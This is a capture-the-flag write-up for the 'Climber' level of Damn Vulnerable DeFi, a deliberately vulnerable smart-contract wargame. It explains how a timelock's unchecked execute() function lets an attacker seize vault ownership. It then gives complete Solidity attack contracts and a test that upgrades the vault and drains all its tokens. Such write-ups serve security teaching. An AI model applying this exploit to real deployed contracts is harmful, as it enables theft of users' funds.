# #12 Climber Damn Vulnerable Defi

## Goals

=> There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the [UUPS pattern](https://eips.ethereum.org/EIPS/eip-1822).

=> The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.

=> On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.

=> On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.

=> To pass this challenge, take all tokens from the vault.

### Hints

- None

### Solution

- There is a bad practice of checking conditions after an external call in the `execute()` function which is callable by anyone, with arbitrary addresses, values and data which allows us to do any external call to any address we want with any function selector we want + there is no access control on that function which gives us a point of reentrancy
- The `ClimberTimelock` contract also is an `admin` and admins can call the `grantRole()`, `transferOwnership()` and `updateDelay()` functions
- So we now can call the `execute()` function which will get `dataElements` that includes the `abi.encodeWithSignature()` of the `transferOwnership()` function and makes our attacker the owner, on the second iteration we will send the `abi.encodeWithSignature()` of the `grantRole()` function with the needed parameters which grants our attacker the role `proposer`, on the third iteration we will send the `abi.encodeWithSignature()` of the `updateDelay()` function with 0 as parameter to reduce the time that needs to pass between `schedule()` & `execute()`, on the last iteration we now can schedule the operation with the input parameters we sent with the `execute()` function, which will then allow us to pass the `if (getOperationState(id) != OperationState.ReadyForExecution)` check
- Now we are the `owner` and therefore we can upgrade the contract and implement whatever logic we want on that new contract, in this case we want to withdraw all tokens

### Attacker Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract Attacker {
    address payable private immutable timelock;

    uint256[] private _values = [0, 0, 0, 0];
    address[] private _targets = new address[](4);
    bytes[] private _elements = new bytes[](4);

    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        _targets = [_timelock, _vault, _timelock, address(this)];

        _elements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );
        _elements[1] = abi.encodeWithSignature(
            "transferOwnership(address)",
            msg.sender
        );
        _elements[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _elements[3] = abi.encodeWithSignature("schedule()");
    }

    function attack() external {
        ClimberTimelock(timelock).execute(
            _targets,
            _values,
            _elements,
            bytes32("SALTY")
        );
    }

    function schedule() external {
        ClimberTimelock(timelock).schedule(
            _targets,
            _values,
            _elements,
            bytes32("SALTY")
        );
    }
}

contract Stealer is ClimberVault {
    function steal(address target) external {
        IERC20 token = IERC20(target);
        bool success = token.transfer(
            msg.sender,
            token.balanceOf(address(this))
        );
        require(success, "hack failed");
    }
}

```

### Test

```javascript
it('Execution', async function () {
	const attackerContract = await (
		await ethers.getContractFactory('Attacker', player)
	).deploy(timelock.address, vault.address);

	// Call attack function on attackerContract with the player
	await attackerContract.connect(player).attack();

	// Update Vault logic to Stealer contracts logic
	const Stealer = await ethers.getContractFactory('Stealer', player);
	const stealer = await upgrades.upgradeProxy(vault.address, Stealer);

	// Sweep the funds of the new VaultV2 contract
	await stealer.connect(player).steal(token.address);
});
```
